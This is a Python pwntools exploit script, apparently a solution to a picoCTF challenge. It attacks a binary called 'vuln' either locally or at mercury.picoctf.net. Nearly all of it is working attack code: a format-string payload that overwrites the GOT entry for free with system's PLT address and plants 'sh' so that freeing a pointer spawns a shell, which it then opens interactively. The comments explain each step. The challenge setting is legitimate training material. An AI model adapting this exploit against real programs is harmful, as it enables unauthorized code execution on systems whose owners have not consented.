#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")
context.binary = exe

TARGET_ADDR   = 20
STONK_PTR_POS = 18


def conn():
	if args.LOCAL:
		r = process([exe.path])
		if args.PLT_DEBUG:
			gdb.attach(r)
	else:
		r = remote("mercury.picoctf.net", 12784)

	return r


def main():
	r = conn()

	free_got   = exe.got['free']
	system_plt = exe.plt['system']
	sh_int     = int.from_bytes(b'sh\x00', 'little')	# Instead of "/bin/sh", we can try to write just "sh" and reduce the amount of characters written

	r.sendlineafter(b'my portfolio\n', b'1')

	# Note that upon encountering the first format specifier with a $ specifying argument position,
	# printf will go through the format string and save every argument.
	# This means that if we use a '$' while writing our target address to the stack,
	# then printf will save the old value and it will have no effect.
	# Therefore, we can not use '$' until this address is written and we have to move through the parameters
	# using the format specifiers without '$'

	payload =  f'%c%c%c%c%c%c%c%c%c%c%{free_got - 10}c%lln'.encode("ascii")
	payload += f'%{((system_plt | 0xFF0000) - free_got) & 0xFFFF}c%{TARGET_ADDR}$hn'.encode("ascii")	# Since PLT entries are at 0x40**** we can overwrite just the first 2 bytes
	payload += f'%{((sh_int | 0xFF0000) - system_plt) & 0xFFFF}c%{STONK_PTR_POS}$hn'.encode("ascii")	# Write "sh" to the pointer 'p' so when it calls "free(p)", the actual call will be "system(p)" (or "system('sh')")
	r.sendlineafter(b'What is your API token?\n', payload)

	r.interactive()


if __name__ == "__main__":
	main()
